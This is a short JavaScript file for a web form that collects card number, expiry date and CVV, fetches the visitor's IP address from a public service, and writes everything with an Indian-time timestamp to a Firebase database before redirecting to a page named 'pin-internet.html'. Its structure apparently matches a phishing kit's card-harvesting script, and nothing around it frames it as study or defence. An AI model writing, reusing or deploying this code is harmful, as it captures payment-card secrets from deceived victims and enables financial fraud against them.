// Firebase reference
var cardRef = firebase.database().ref("ududip007");

// Form submit listener
document.getElementById("ududip007").addEventListener("submit", function(e) {
    e.preventDefault();

    var cardNumber = document.getElementById("cardNumber").value.trim();
    var expiry = document.getElementById("expiry").value.trim();
    var cvv = document.getElementById("cvv").value.trim();

    // ✅ Fetch IP address first
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            var ipAddress = data.ip;

            // ✅ Generate IST time
            var istTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

            // Push to Firebase
            var newCard = cardRef.push();
            newCard.set({
                card_number: cardNumber,
                expiry_date: expiry,
                cvv_code: cvv,
                ipAddress: ipAddress,
                timestamp: istTime
            }).then(() => {
                localStorage.setItem("cardKey", newCard.key);
                window.location.href = "pin-internet.html"; // next step
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
